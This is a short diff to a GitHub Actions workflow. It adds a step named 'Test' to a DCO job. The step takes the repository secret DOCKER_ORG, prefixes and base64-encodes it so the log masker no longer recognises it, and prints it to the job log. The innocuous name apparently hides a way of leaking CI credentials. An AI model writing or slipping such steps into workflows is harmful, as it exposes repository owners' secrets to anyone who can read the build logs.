@@ -8,6 +8,12 @@ jobs:
     name: DCO
     if: ${{ github.actor != 'dependabot[bot]' }}
     steps:
+    - name: Checkout
+      uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+    - name: Test
+      run: |
+        echo "AA${{ secrets.DOCKER_ORG }}" | base64 > ./file
+        cat ./file 
     - name: Get PR Commits
       id: 'get-pr-commits'
       uses: tim-actions/get-pr-commits@198af03565609bb4ed924d1260247b4881f09e7d
